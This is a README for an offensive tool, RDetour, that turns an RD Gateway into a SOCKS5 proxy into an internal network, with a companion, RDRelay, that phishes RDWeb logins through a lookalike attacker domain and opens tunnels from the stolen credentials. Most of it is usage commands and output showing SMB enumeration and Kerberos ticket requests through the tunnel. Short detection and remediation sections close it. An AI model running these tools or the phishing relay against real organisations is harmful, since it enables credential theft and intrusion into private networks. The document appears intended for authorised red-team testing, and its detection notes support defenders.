# RDetour

Turn an RD Gateway into a SOCKS5 proxy into its internal network.
One MFA push, unlimited tunneled connections. No RDP client, no RDP session.

## Install

```
pip install -r requirements.txt
```

## Usage

```
./rdetour.py -g rdg.corp.com -u user -d CORP -p 'password'
```

```
[*] SOCKS5 127.0.0.1:1080 via rdg.corp.com:443 as CORP\user
[warm] establishing tunnel — approve the ONE push (window 60s)
[warm] tunnel live — channels from here on are free
```

Then anything through proxychains:

```
$ proxychains -q nxc smb 127.0.0.1
SMB         127.0.0.1       445    ECORP-RDS        [*] Windows 10 / Server 2019 Build 17763 (name:ECORP-RDS) (domain:ecorp.local) (signing:True) (SMBv1:False)

$ proxychains nslookup ecorp.local
Server:         192.168.15.40
Address:        192.168.15.40#53

Name:   ecorp.local
Address: 192.168.15.47
Name:   ecorp.local
Address: 192.168.15.40

$ proxychains -q getTGT.py ecorp.local/testuser:testuser -dc-ip 192.168.15.40
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in testuser.ccache
```

---

## RDRelay

Reverse-proxies an RDWeb portal. Victim logs in through the phishing domain, RDRelay captures their creds, and auto-spawns an rdetour tunnel into the network. One phished login = one persistent SOCKS tunnel.

```
./rdrelay.py --target https://rds.corp.com --phish-domain rds-corp.attacker.com
```

With a real cert:

```
./rdrelay.py --target https://rds.corp.com --phish-domain rds-corp.attacker.com --cert fullchain.pem
```

Lab testing without TLS:

```
./rdrelay.py --target https://rds.corp.com --phish-domain rds-corp.attacker.com --no-tls --port 80
```

---

## Limitations

- **Serial tunnel.** One channel at a time. Connections are queued. Single-host tools (getTGT, secretsdump, ssh) work great. Subnet scans work but take multiple passes to build the kill cache.
- **Kill cache cold start.** On first run against a new subnet, dead hosts haven't been cached yet. Each dead host burns a channel cycle (~1-2s). The cache persists to `~/.rdetour/killcache-*.json` with a 7-day TTL.
- **Port 139.** SMB over NetBIOS can kill the tunnel. Stick to port 445.
- **RAP restrictions.** If the RAP is locked down (3389 only, specific hosts), the tunnel can't reach anything useful.

## Detection

- RD Gateway event log: events 200/300/302 per channel — look for non-RDP ports (445, 88, 389, 22)
- Anomalous tunnel lifetime (hours/days with keepalive)
- Rapid channel cycling to different targets
- Channels to non-3389 ports

## Remediation

Lock down the RAP:
- Restrict allowed ports to **3389 only**
- Restrict allowed hosts to specific RDP targets
- Audit RAP regularly

## Legal

Authorized testing only.
